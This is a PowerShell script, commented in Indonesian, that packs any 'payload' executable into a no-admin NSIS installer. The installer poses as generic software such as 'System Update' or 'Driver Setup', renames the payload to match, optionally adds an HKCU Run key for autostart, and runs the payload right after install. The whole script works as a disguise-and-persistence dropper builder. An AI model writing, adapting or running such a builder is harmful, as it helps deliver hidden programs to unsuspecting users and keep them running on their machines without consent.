# Bundler NSIS untuk payload PC.
#
# Membungkus satu exe payload menjadi installer per-user (tanpa admin) yang:
#   - memasang ke %LOCALAPPDATA%\Programs\<Nama>
#   - menulis entri Uninstall di HKCU supaya muncul di "Apps & features"
#   - membuat shortcut Desktop + Start Menu
#   - opsional menulis Run key HKCU (autostart)
#   - menjalankan payload setelah pemasangan
#
# Pemakaian:
#   .\tools\bundle.ps1                          # satu installer dari dist\payload.exe
#   .\tools\bundle.ps1 -All                     # lima preset nama
#   .\tools\bundle.ps1 -Name "Driver Setup" -Version 2.1.0 -RunKey
#   .\tools\bundle.ps1 -Payload dist\payload.exe -NoLaunch
#
# Hasil ada di dist\bundles\ beserta sha256 tiap file.

param(
    [string]$Payload = "dist\payload.exe",
    [string]$Name = "System Update",
    [string]$Version = "1.3.65",
    [string]$Publisher = "System",
    [string]$OutDir = "dist\bundles",
    [string]$Icon = "",
    [switch]$RunKey,
    [switch]$NoLaunch,
    [switch]$All,
    [string]$Nsis = ""
)

$ErrorActionPreference = 'Stop'
Set-Location (Split-Path -Parent $PSScriptRoot)

if (-not $Nsis) {
    $cand = @(
        "D:\Buat rusuh\Project\NSIS\Bin\makensis.exe",
        "D:\Buat rusuh\Project\NSIS\makensis.exe",
        "$env:TEMP\opencode\nsis\nsis-3.10\Bin\makensis.exe",
        "$env:ProgramFiles\NSIS\makensis.exe",
        "${env:ProgramFiles(x86)}\NSIS\makensis.exe",
        "$env:LOCALAPPDATA\Programs\NSIS\makensis.exe"
    )
    $Nsis = $cand | Where-Object { Test-Path $_ } | Select-Object -First 1
}
if (-not $Nsis -or -not (Test-Path $Nsis)) {
    throw "makensis tidak ditemukan. Set -Nsis <path>."
}

$payloadPath = (Resolve-Path $Payload).Path
$payloadName = Split-Path -Leaf $payloadPath
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$OutDir = (Resolve-Path $OutDir).Path

# Nama exe di dalam folder pasang: pakai nama produk, bukan nama file payload.
function Safe-Exe([string]$s) {
    $bad = [IO.Path]::GetInvalidFileNameChars() + [char]' '
    $out = -join ($s.ToCharArray() | ForEach-Object { if ($bad -contains $_) { '_' } else { $_ } })
    if (-not $out.ToLower().EndsWith('.exe')) { $out += '.exe' }
    return $out
}

function Four-Part([string]$v) {
    $p = @($v -split '[\.\-]' | Where-Object { $_ -match '^\d+$' })
    while ($p.Count -lt 4) { $p += '0' }
    return ($p[0..3] -join '.')
}

function Build-One([string]$product, [string]$ver, [string]$publisher, [string]$icon, [bool]$runKey, [bool]$launch) {
    $exe = Safe-Exe $product
    $regKey = ($product -replace '[^A-Za-z0-9]', '') + "_" + ($ver -replace '[^0-9]', '')
    $safeStem = ($product -replace '[^A-Za-z0-9]', '_')
    $outFile = Join-Path $OutDir ("Setup_{0}_{1}.exe" -f $safeStem, ($ver -replace '[^0-9\.]', ''))
    $nsi = Join-Path $OutDir ("{0}.nsi" -f $safeStem)

    $iconLine = ""
    if ($icon -and (Test-Path $icon)) {
        $iconFull = (Resolve-Path $icon).Path
        $iconLine = "Icon `"$iconFull`"`nUninstallIcon `"$iconFull`""
    }

    $runKeyBlock = ""
    if ($runKey) {
        $runKeyBlock = @'
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PRODUCT_NAME}" '"$INSTDIR\${APP_EXE}"'
  WriteRegStr HKCU "Software\${REGKEY}" "Run" "1"
'@
    }

    $launchBlock = ""
    if ($launch) {
        $launchBlock = '  Exec ''"$INSTDIR\${APP_EXE}"'''
    }

    $template = @'
Unicode true
!include "MUI2.nsh"
!include "LogicLib.nsh"

!define PRODUCT_NAME "{{NAME}}"
!define PRODUCT_VERSION "{{VERSION}}"
!define PRODUCT_PUBLISHER "{{PUBLISHER}}"
!define REGKEY "{{REGKEY}}"
!define APP_EXE "{{EXE}}"
!define APP_EXE_UNQUOTED {{EXE}}

Name "${PRODUCT_NAME} ${PRODUCT_VERSION}"
OutFile "{{OUTFILE}}"
InstallDir "$LOCALAPPDATA\Programs\${PRODUCT_NAME}"
InstallDirRegKey HKCU "Software\${REGKEY}" "InstallDir"
RequestExecutionLevel user
SetCompressor /SOLID lzma
SetCompressorDictSize 32
{{ICON}}

VIProductVersion "{{VI4}}"
VIAddVersionKey "ProductName" "${PRODUCT_NAME}"
VIAddVersionKey "ProductVersion" "${PRODUCT_VERSION}"
VIAddVersionKey "CompanyName" "${PRODUCT_PUBLISHER}"
VIAddVersionKey "FileDescription" "${PRODUCT_NAME} installer"
VIAddVersionKey "FileVersion" "{{VI4}}"
VIAddVersionKey "LegalCopyright" "${PRODUCT_PUBLISHER}"

!define MUI_ABORTWARNING
!define MUI_FINISHPAGE_RUN "$INSTDIR\${APP_EXE}"
!define MUI_FINISHPAGE_RUN_TEXT "Jalankan ${PRODUCT_NAME}"
!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_PAGE_FINISH
!insertmacro MUI_UNPAGE_CONFIRM
!insertmacro MUI_UNPAGE_INSTFILES
!insertmacro MUI_LANGUAGE "English"

Section "Install"
  SetOutPath "$INSTDIR"
  File "/oname=${APP_EXE}" "{{PAYLOAD}}"

  WriteRegStr HKCU "Software\${REGKEY}" "InstallDir" "$INSTDIR"
  WriteRegStr HKCU "Software\${REGKEY}" "Version" "${PRODUCT_VERSION}"

  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "DisplayName" "${PRODUCT_NAME}"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "Publisher" "${PRODUCT_PUBLISHER}"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "InstallLocation" "$INSTDIR"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "UninstallString" '"$INSTDIR\uninst.exe"'
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "QuietUninstallString" '"$INSTDIR\uninst.exe" /S'
  WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "NoModify" 1
  WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}" "NoRepair" 1

  CreateDirectory "$SMPROGRAMS\${PRODUCT_NAME}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk" "$INSTDIR\${APP_EXE}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\Uninstall.lnk" "$INSTDIR\uninst.exe"
  CreateShortCut "$DESKTOP\${PRODUCT_NAME}.lnk" "$INSTDIR\${APP_EXE}"

  WriteUninstaller "$INSTDIR\uninst.exe"

{{RUNKEY}}

{{LAUNCH}}
SectionEnd

Section "Uninstall"
  nsExec::Exec 'taskkill /f /im "${APP_EXE_UNQUOTED}"'
  Pop $0

  Delete "$INSTDIR\${APP_EXE}"
  Delete "$INSTDIR\uninst.exe"
  RMDir "$INSTDIR"

  Delete "$DESKTOP\${PRODUCT_NAME}.lnk"
  Delete "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk"
  Delete "$SMPROGRAMS\${PRODUCT_NAME}\Uninstall.lnk"
  RMDir "$SMPROGRAMS\${PRODUCT_NAME}"

  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PRODUCT_NAME}"
  DeleteRegKey HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\${REGKEY}"
  DeleteRegKey HKCU "Software\${REGKEY}"
SectionEnd
'@

    $text = $template
    $text = $text.Replace('{{NAME}}', $product)
    $text = $text.Replace('{{VERSION}}', $ver)
    $text = $text.Replace('{{PUBLISHER}}', $publisher)
    $text = $text.Replace('{{REGKEY}}', $regKey)
    $text = $text.Replace('{{EXE}}', $exe)
    $text = $text.Replace('{{OUTFILE}}', $outFile)
    $text = $text.Replace('{{PAYLOAD}}', $payloadPath)
    $text = $text.Replace('{{ICON}}', $iconLine)
    $text = $text.Replace('{{VI4}}', (Four-Part $ver))
    $text = $text.Replace('{{RUNKEY}}', $runKeyBlock)
    $text = $text.Replace('{{LAUNCH}}', $launchBlock)

    # UTF-8 tanpa BOM: makensis menolak BOM di awal file skrip.
    [IO.File]::WriteAllText($nsi, $text, (New-Object System.Text.UTF8Encoding($false)))

    Write-Host "[*] $product $ver" -ForegroundColor Cyan
    & $Nsis /V2 /NOCD $nsi
    if ($LASTEXITCODE -ne 0) { throw "makensis gagal untuk $product (exit $LASTEXITCODE)" }

    $f = Get-Item $outFile
    $h = (Get-FileHash $outFile -Algorithm SHA256).Hash
    Write-Host ("    {0}  {1:N2} MB  sha256 {2}" -f $f.Name, ($f.Length / 1MB), $h.Substring(0, 16)) -ForegroundColor Green
    return [pscustomobject]@{
        Product = $product
        Version = $ver
        File    = $f.FullName
        Bytes   = $f.Length
        Sha256  = $h
    }
}

$presets = @(
    @{ Name = "System Update";  Version = "1.3.65" },
    @{ Name = "Driver Setup";   Version = "2.1.0"  },
    @{ Name = "Media Pack";     Version = "4.0.2"  },
    @{ Name = "Font Bundle";    Version = "1.9.4"  },
    @{ Name = "Runtime Plus";   Version = "3.2.7"  }
)

Write-Host ("payload : {0}  ({1:N2} MB)" -f $payloadName, ((Get-Item $payloadPath).Length / 1MB))
Write-Host ("nsis    : {0}" -f $Nsis)
Write-Host ("output  : {0}" -f $OutDir)
Write-Host ""

$results = @()
if ($All) {
    foreach ($p in $presets) {
        $results += Build-One $p.Name $p.Version $Publisher $Icon $RunKey.IsPresent (-not $NoLaunch.IsPresent)
    }
} else {
    $results += Build-One $Name $Version $Publisher $Icon $RunKey.IsPresent (-not $NoLaunch.IsPresent)
}

Write-Host ""
$results | Format-Table Product, Version, @{n = 'MB'; e = { [math]::Round($_.Bytes / 1MB, 2) } }, @{n = 'sha256'; e = { $_.Sha256.Substring(0, 16) } } -AutoSize | Out-String | Write-Host
